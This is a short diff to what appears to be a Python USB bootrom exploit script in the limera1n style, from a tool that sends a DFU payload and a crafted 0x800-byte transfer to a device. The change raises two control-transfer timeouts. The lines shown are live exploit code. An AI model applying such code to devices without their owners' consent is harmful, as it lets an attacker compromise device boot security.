@@ -196,12 +196,12 @@ def exploit():
     
     dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))
 
-    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 100)) == 1
+    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1
 
     limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 10)
 
     try:
-        device.ctrl_transfer(0x21, 2, 0, 0, 0, 1)
+        device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
         print 'ERROR: This request succeeded, but it should have raised an exception. Exiting.'
         sys.exit(1)
     except usb.core.USBError:
